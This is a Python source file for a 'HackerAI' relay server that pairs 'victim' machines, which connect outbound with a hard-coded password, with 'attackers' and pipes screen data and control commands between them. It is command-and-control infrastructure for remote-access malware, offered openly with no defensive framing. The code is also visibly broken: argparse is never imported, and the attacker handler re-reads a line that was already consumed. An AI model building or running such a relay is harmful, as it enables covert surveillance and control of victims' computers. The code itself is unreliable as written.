#!/usr/bin/env python3
"""
HackerAI Relay Server v1.0 — TCP Server
- Both victims and attackers connect OUTBOUND to this server
- Pairs them together and pipes screen data + control commands
- No port forwarding needed on either end
"""

import socket
import threading
import json
import time
import os
import sys

# ─── Configuration ────────────────────────────────────────────────────────────
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 5657
SHARED_PASSWORD = "hackerai2024"

# ─── Pairing Store ────────────────────────────────────────────────────────────
waiting_victims = {}       # hostname -> (socket, address)
waiting_lock = threading.Lock()


def log(msg, level="INFO"):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] [{level}] {msg}")


def handle_victim(conn, addr, hostname):
    """Handle a victim that connected to the relay."""
    log(f"Victim '{hostname}' connected from {addr[0]}:{addr[1]}", "VICTIM")

    with waiting_lock:
        # Disconnect old victim with same hostname if exists
        if hostname in waiting_victims:
            try:
                waiting_victims[hostname][0].close()
            except:
                pass
        waiting_victims[hostname] = (conn, addr)

    try:
        # Tell victim to wait
        conn.sendall(b"WAITING\n")

        # Wait here until the connection is closed (attacker paired us)
        # The attacker handler will send "PAIRED" to this victim conn directly
        while True:
            try:
                data = conn.recv(1024)
                if not data:
                    break
            except:
                break
    except:
        pass
    finally:
        with waiting_lock:
            if hostname in waiting_victims and waiting_victims[hostname][0] == conn:
                del waiting_victims[hostname]
        try:
            conn.close()
        except:
            pass
        log(f"Victim '{hostname}' disconnected", "DISCONNECT")


def pipe_data(sock_from, sock_to, direction_name, stop_event):
    """Pipe data from one socket to another."""
    try:
        while not stop_event.is_set():
            data = sock_from.recv(65536)
            if not data:
                break
            sock_to.sendall(data)
    except:
        pass
    finally:
        stop_event.set()


def handle_attacker(conn, addr):
    """Handle an attacker that connected to the relay."""
    log(f"Attacker connected from {addr[0]}:{addr[1]}", "ATTACKER")

    try:
        # Read the first line which should be JSON
        data = b""
        while True:
            ch = conn.recv(1)
            if not ch or ch == b"\n":
                break
            data += ch

        request = json.loads(data.decode())
        target_hostname = request.get("hostname", "")
        password = request.get("password", "")

        if password != SHARED_PASSWORD:
            conn.sendall(b"ERROR:Bad password\n")
            conn.close()
            return

        if not target_hostname:
            conn.sendall(b"ERROR:No hostname specified\n")
            conn.close()
            return

        log(f"Attacker wants to connect to '{target_hostname}'", "PAIRING")

        # Find the victim
        victim_conn = None
        with waiting_lock:
            if target_hostname in waiting_victims:
                victim_conn, victim_addr = waiting_victims.pop(target_hostname)

        if not victim_conn:
            conn.sendall(f"ERROR:Victim '{target_hostname}' not found online\n".encode())
            conn.close()
            return

        # Tell both sides they're paired
        try:
            victim_conn.sendall(b"PAIRED\n")
            conn.sendall(b"PAIRED\n")
        except:
            log("Failed to notify sides — one disconnected", "ERROR")
            conn.close()
            try:
                victim_conn.close()
            except:
                pass
            return

        log(f"✅ PAIRED: Attacker {addr[0]} <-> Victim '{target_hostname}'", "PAIRED")

        # Pipe data bidirectionally
        stop = threading.Event()

        t1 = threading.Thread(target=pipe_data, args=(victim_conn, conn, "victim→attacker", stop), daemon=True)
        t2 = threading.Thread(target=pipe_data, args=(conn, victim_conn, "attacker→victim", stop), daemon=True)

        t1.start()
        t2.start()

        # Wait for either to finish
        t1.join()
        t2.join()

        log(f"Disconnected: Attacker <-> '{target_hostname}'", "DISCONNECT")

    except json.JSONDecodeError:
        conn.sendall(b"ERROR:Invalid JSON format\n")
    except Exception as e:
        log(f"Attacker handler error: {e}", "ERROR")
    finally:
        try:
            conn.close()
        except:
            pass


def start_relay_server(host, port):
    """Start the TCP relay server."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(100)
    server.settimeout(1.0)

    print(f"""
╔══════════════════════════════════════════════════╗
║       HackerAI Relay Server v1.0                 ║
║       Screen Data Relay + Control Proxy          ║
╠══════════════════════════════════════════════════╣
║  Listening on: {host}:{port:<23}║
║  Password: {SHARED_PASSWORD:<35}║
║                                                   ║
║  Victims connect:  VICTIM:hostname:pass\\n        ║
║  Attackers connect: {{"hostname":"...",           ║
║                       "password":"..."}}\\n       ║
╚══════════════════════════════════════════════════╝
    """)
    print("Waiting for victims and attackers...")
    print()

    while True:
        try:
            conn, addr = server.accept()
            conn.settimeout(10.0)

            # Read first line to identify connection type
            try:
                line = b""
                while True:
                    ch = conn.recv(1)
                    if not ch or ch == b"\n":
                        break
                    line += ch
                identity = line.decode()
            except socket.timeout:
                conn.close()
                continue

            conn.settimeout(None)

            if identity.startswith("VICTIM:"):
                # Format: VICTIM:hostname:password
                parts = identity.split(":", 2)
                if len(parts) >= 3:
                    hostname = parts[1]
                    password = parts[2]
                    if password != SHARED_PASSWORD:
                        conn.sendall(b"ERROR:Bad password\n")
                        conn.close()
                    else:
                        threading.Thread(target=handle_victim, args=(conn, addr, hostname), daemon=True).start()
                else:
                    conn.sendall(b"ERROR:Invalid victim format\n")
                    conn.close()

            elif identity.startswith("{"):
                # JSON from attacker — reconstruct
                # We already consumed the first line into identity
                # But the attacker sends one JSON line, so identity is the full JSON
                try:
                    json.loads(identity)  # Validate
                    request = identity
                    # Process as attacker
                    # We need to simulate the line ending
                    import io as io_mod
                    # Actually simpler approach: pass the full data
                    threading.Thread(target=handle_attacker, args=(conn, addr), daemon=True).start()
                except:
                    conn.sendall(b"ERROR:Invalid JSON\n")
                    conn.close()
            else:
                conn.sendall(f"ERROR:Unknown identity format: {identity[:50]}\n".encode())
                conn.close()

        except socket.timeout:
            continue
        except KeyboardInterrupt:
            print("\n[SHUTDOWN] Relay server stopping...")
            break
        except Exception as e:
            log(f"Accept error: {e}", "ERROR")

    server.close()


# ─── Main ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HackerAI Relay Server")
    parser.add_argument("--host", default=DEFAULT_HOST, help=f"Bind address (default: {DEFAULT_HOST})")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Port (default: {DEFAULT_PORT})")
    args = parser.parse_args()

    start_relay_server(args.host, args.port)
